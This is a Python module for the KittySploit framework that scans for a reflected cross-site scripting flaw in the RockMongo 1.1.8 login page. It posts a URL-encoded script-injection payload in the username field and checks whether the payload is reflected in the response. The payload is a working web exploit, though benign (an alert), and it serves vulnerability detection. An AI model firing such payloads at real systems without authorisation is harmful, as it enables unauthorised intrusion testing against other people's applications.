#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RockMongo 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'RockMongo 1.1.8 - Cross-Site Scripting Detection',
        'description': 'RockMongo 1.1.8 contains a cross-site scripting vulnerability which allows attackers to inject arbitrary JavaScript into the response returned by the application.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'rockmongo', 'xss', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/136658/RockMongo-1.1.8-Cross-Site-Request-Forgery-Cross-Site-Scripting.html',
        ],
    }

    def run(self):
        path = '/index.php?action=login.index'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"><script>alert(document.domain)</script>',)
        header_any = ('Content-Type: text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason='RockMongo 1.1.8 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

